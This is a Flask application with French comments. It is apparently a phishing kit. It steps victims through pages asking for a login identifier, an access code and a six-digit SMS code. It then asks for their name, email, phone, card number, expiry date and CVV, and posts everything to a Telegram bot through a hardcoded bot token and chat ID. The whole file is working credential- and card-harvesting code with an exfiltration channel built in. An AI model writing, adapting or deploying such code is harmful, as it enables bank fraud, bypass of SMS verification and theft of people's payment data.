from flask import Flask, render_template, request, redirect, url_for, session
import requests
import traceback

app = Flask(__name__)
app.secret_key = "supersecretkey"  # À changer pour la prod

# Étape 1: identifiant
@app.route('/', methods=['GET', 'POST'])
def identifiant():
    if request.method == 'POST':
        session['identifiant'] = request.form.get('identifiant', '')
        return redirect(url_for('code'))
    return render_template('identifiant.html')

# Étape 2: code
@app.route('/code', methods=['GET', 'POST'])
def code():
    identifiant = session.get('identifiant', 'Aucun')
    if request.method == 'POST':
        session['code'] = request.form.get('code', '')
        return redirect(url_for('sms'))
    return render_template('code.html', identifiant=identifiant)

# Étape 3: sms (récupération champs sms1 à sms6 concaténés)
@app.route('/sms', methods=['GET', 'POST'])
def sms():
    if request.method == 'POST':
        sms_code = ''.join([
            request.form.get('sms1', ''),
            request.form.get('sms2', ''),
            request.form.get('sms3', ''),
            request.form.get('sms4', ''),
            request.form.get('sms5', ''),
            request.form.get('sms6', '')
        ])
        session['sms'] = sms_code
        return redirect(url_for('formulaire'))
    return render_template('sms.html')

# Étape 4: formulaire complet
@app.route('/formulaire', methods=['GET', 'POST'])
def formulaire():
    if request.method == 'POST':
        identifiant = session.get('identifiant', '')
        code = session.get('code', '')
        sms = session.get('sms', '')

        nom = request.form.get('nom', '')
        prenom = request.form.get('prenom', '')
        email = request.form.get('email', '')  # <-- récupère email
        numero_cb = request.form.get('numero_cb', '')
        date_expiration = request.form.get('date_expiration', '')
        cvv = request.form.get('cvv', '')
        telephone = request.form.get('telephone', '')

        bot_token = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
        chat_id = "6297861735"

        message = (
            f"--- Soumission complète ---\n"
            f"Identifiant : {identifiant}\n"
            f"Code : {code}\n"
            f"SMS : {sms}\n"
            f"Nom : {nom}\n"
            f"Prénom : {prenom}\n"
            f"Email : {email}\n"
            f"Numéro CB : {numero_cb}\n"
            f"Expiration : {date_expiration}\n"
            f"CVV : {cvv}\n"
            f"Téléphone : {telephone}"
        )

        if bot_token and chat_id:
            try:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                data = {'chat_id': chat_id, 'text': message}
                response = requests.post(url, data=data, timeout=10)
                if response.status_code == 200:
                    print("Message Telegram envoyé avec succès.")
                else:
                    print(f"Erreur Telegram: {response.status_code} - {response.text}")
            except Exception as e:
                print("Erreur lors de l'envoi Telegram:", e)
                traceback.print_exc()
        else:
            print("Bot token ou Chat ID manquant.")

        return redirect(url_for('merci'))

    return render_template('formulaire.html')

# Page de remerciement
@app.route('/merci')
def merci():
    return render_template('merci.html')

if __name__ == '__main__':
    app.run(debug=True)
